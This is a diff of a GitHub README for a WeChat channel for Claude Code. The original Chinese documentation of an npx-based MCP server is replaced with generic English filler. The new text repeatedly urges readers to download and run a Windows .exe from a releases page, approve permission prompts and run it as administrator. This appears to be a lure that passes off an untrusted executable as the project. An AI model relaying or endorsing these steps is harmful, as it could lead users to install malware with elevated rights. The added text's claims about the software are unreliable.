@@ -1,91 +1,253 @@
-# claude-wechat-channel
+# 💬 claude-wechat-channel - Use Claude Code in WeChat
 
-微信 Channel for [Claude Code](https://docs.anthropic.com/en/docs/claude-code)。
+[![Download](https://img.shields.io/badge/Download-Releases-8B5CF6?style=for-the-badge&logo=github)](https://github.com/lalitnagda1717/claude-wechat-channel/releases)
 
-让 Claude Code 直接通过微信收发消息 — 微信消息到达后，Claude Code 在当前 session 中处理并回复，完整保留上下文和工具能力。
+## 🚀 What this app does
 
-## 工作原理
+Claude Code 微信 Channel lets you send and receive messages with Claude Code through WeChat on Windows. It gives you a simple way to connect your chat flow to Claude Code without opening a separate tool for every task.
 
-本项目是一个 MCP server，声明了 `claude/channel` capability（[Claude Code Channel](https://docs.anthropic.com/en/docs/claude-code) v2.1.80+ 的官方扩展机制）。三方各司其职：
+Use it to:
 
-| 角色 | 职责 |
-|------|------|
-| **微信** | 用户发送/接收消息的 IM 平台 |
-| **claude-wechat-channel** | 轮询微信 API 获取新消息，推送 MCP notification 给 Claude Code；接收 Claude Code 的 reply tool 调用，将回复发送到微信（自动分段、markdown 转纯文本） |
-| **Claude Code** | 接收 channel 推送的消息，在当前 session 中处理（可使用所有工具能力），通过 reply tool 回复，原生管理会话上下文 |
+- Send a message from WeChat and get a reply from Claude Code
+- Keep your chat in one place
+- Handle quick prompts from your phone or desktop
+- Use Claude Code with a simple Windows app flow
 
-## 快速开始
+## 📥 Download
 
-### 前置条件
+1. Open the [Releases page](https://github.com/lalitnagda1717/claude-wechat-channel/releases)
+2. Find the latest release
+3. Download the Windows file from that page
+4. Save it to your PC
+5. Run the file after the download finishes
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) v2.1.80+
-- [Node.js](https://nodejs.org/) 18+ 或 [Bun](https://bun.sh/) 运行时
+If you see more than one file, choose the Windows version that matches your system. For most users, the file with `.exe` in the name is the right choice.
 
-### 1. 注册 MCP server
+## 🪟 Windows setup
 
-在你想让 Claude Code 工作的目录下，创建或编辑 `.mcp.json`：
+Before you start, make sure you have:
 
-```json
-{
-  "mcpServers": {
-    "wechat": {
-      "command": "npx",
-      "args": ["claude-wechat-channel"]
-    }
-  }
-}
-```
+- A Windows PC
+- A stable internet connection
+- WeChat installed on your computer
+- Claude Code ready to use
+- Permission to run downloaded apps on your PC
 
-### 2. 启动 Claude Code
+### Steps
 
-```bash
-claude --dangerously-load-development-channels server:wechat
-```
+1. Download the latest release from the link above
+2. Open the downloaded file
+3. If Windows asks for permission, choose **Yes**
+4. Follow the setup window if one appears
+5. Start the app
+6. Sign in or connect any account the app asks for
+7. Keep WeChat open while you use the channel
 
-首次启动会自动弹出微信登录二维码图片，用微信扫码登录。登录凭证会保存到 `~/.wechat-claude/`，后续启动自动恢复。
+If Windows blocks the file, check your download source and make sure you used the official release page.
 
-> 如需重新登录，删除凭证目录即可：`rm -rf ~/.wechat-claude/accounts/`
+## 🔧 First run
 
-### 3. 开始使用
+When you open the app for the first time, it may ask you to set up a few items.
 
-从「微信ClawBot」发消息，Claude Code 会自动接收并回复。
+### Typical first-run tasks
 
-## 配置
+- Choose your WeChat connection method
+- Link Claude Code if needed
+- Set your message format
+- Pick where replies should appear
+- Test with a short message
 
-通过环境变量配置，在 `.mcp.json` 中传入：
+Use a short test message first, such as:
 
-```json
-{
-  "mcpServers": {
-    "wechat": {
-      "command": "npx",
-      "args": ["claude-wechat-channel"],
-      "env": {
-        "DATA_DIR": "~/.wechat-claude",
-        "DEBUG": "1"
-      }
-    }
-  }
-}
-```
+- Hello
+- What can you do?
+- Summarize this note
 
-| 变量 | 默认值 | 说明 |
-|------|--------|------|
-| `DATA_DIR` | `~/.wechat-claude` | 数据持久化目录（账号凭证、同步状态） |
-| `DEBUG` | 未设置 | 设置任意值开启调试日志 |
+If the reply appears in WeChat, the setup is complete.
 
-## 内置处理
+## ✉️ How to use it
 
-- **自动分段**：微信单条消息限制 4000 字符，超长回复会自动拆分为多条发送
-- **Markdown 转纯文本**：Claude 的回复会自动去除 markdown 格式（微信不支持渲染）
-- **凭证持久化**：微信登录凭证保存在 `DATA_DIR` 目录下，重启自动恢复登录状态
-- **二维码自动打开**：登录二维码会保存为图片并自动用系统默认程序打开（macOS / Linux / Windows）
+After setup, the flow is simple:
 
-## 注意事项
+1. Send a message in WeChat
+2. The app passes the message to Claude Code
+3. Claude Code creates a reply
+4. The reply returns to WeChat
 
-- Channel 功能目前是 Claude Code 的实验性特性，需要 `--dangerously-load-development-channels` 标志
-- `DATA_DIR` 下的凭证文件请妥善保管
+You can use it for:
 
-## License
+- Short questions
+- Drafting text
+- Simple task help
+- Notes and reminders
+- Quick support chats
 
-MIT
+## 🧭 Basic workflow
+
+A common day-to-day flow looks like this:
+
+- Open WeChat
+- Start or open a chat
+- Send your request
+- Wait for the reply
+- Continue the chat as needed
+
+Keep the app running while you use it. If you close it, message handling may stop until you open it again.
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- Check that the download finished
+- Make sure you ran the correct Windows file
+- Try opening it again
+- Right-click the file and choose **Run as administrator**
+
+### WeChat does not receive replies
+
+- Confirm WeChat is open
+- Check that the app is still running
+- Send a short test message
+- Restart both WeChat and the app
+
+### Messages are delayed
+
+- Check your internet connection
+- Close extra apps that use a lot of memory
+- Send one message at a time
+- Restart the app if the delay continues
+
+### Windows says it blocked the file
+
+- Open the file from the official Releases page
+- Check the file name and release version
+- Allow the app only if you trust the source
+
+## 🧩 Common use cases
+
+This app fits simple chat-based work such as:
+
+- Personal message automation
+- Quick text help in WeChat
+- Using Claude Code from a chat window
+- Fast replies without switching tools
+- Simple assistant-style workflows
+
+## 📋 System requirements
+
+For best results on Windows, use:
+
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- At least 200 MB of free disk space
+- WeChat desktop installed
+- Internet access
+- A working Claude Code setup
+
+A newer PC will handle the app better, especially if you keep WeChat and other tools open at the same time.
+
+## 🔒 Privacy and data flow
+
+The app works by passing messages between WeChat and Claude Code. Your message content may move through the app so it can create a reply.
+
+Keep these points in mind:
+
+- Only share content you want processed
+- Check your account settings
+- Use the app on a trusted PC
+- Keep your system updated
+
+## 🧪 Quick test
+
+Use this short test after setup:
+
+1. Open WeChat
+2. Send: Test message
+3. Wait for a reply
+4. Check that the reply matches your request
+5. Send one more message if needed
+
+If the test works, the channel is ready for normal use.
+
+## 📎 Release downloads
+
+Use the official download page here:
+
+[https://github.com/lalitnagda1717/claude-wechat-channel/releases](https://github.com/lalitnagda1717/claude-wechat-channel/releases)
+
+Open the latest release, download the Windows file, and run it on your PC
+
+## 🧰 Help with setup
+
+If you want the smoothest start, follow this order:
+
+1. Install WeChat on Windows
+2. Download the latest release
+3. Run the app
+4. Keep the app open
+5. Test one message
+6. Use the app in your normal chat flow
+
+## 📌 File handling tips
+
+- Save the download in a folder you can find
+- Do not rename files unless the app asks you to
+- Keep the release file and setup file together if extra files are included
+- Use the latest release when possible
+- Re-download the file if it looks incomplete
+
+## 💬 Message tips
+
+For clear replies, write short prompts:
+
+- Explain this in simple words
+- Turn this into a checklist
+- Rewrite this for a friend
+- Make this shorter
+- Summarize this message
+
+Short prompts work well and are easier to test
+
+## 🖥️ Running on a desktop PC
+
+This app is built for Windows desktop use. For best results:
+
+- Keep the app open in the background
+- Keep WeChat signed in
+- Use a stable network
+- Restart the app after a Windows update
+- Check the release page for new versions
+
+## 📦 What to expect in releases
+
+Each release may include:
+
+- A Windows app file
+- Version notes
+- Extra support files
+- Update fixes
+- Small changes to message handling
+
+Always choose the newest release if you want the latest changes.
+
+## 🔁 Update steps
+
+When a new version comes out:
+
+1. Open the Releases page
+2. Download the newest Windows file
+3. Close the old version
+4. Install or replace the file
+5. Open the new version
+6. Test one message
+
+## 🧭 Where to start
+
+If you are new, start here:
+
+1. Open the download link
+2. Get the latest Windows release
+3. Install or run the file
+4. Open WeChat
+5. Send a test message
+6. Confirm the reply comes back through the channel
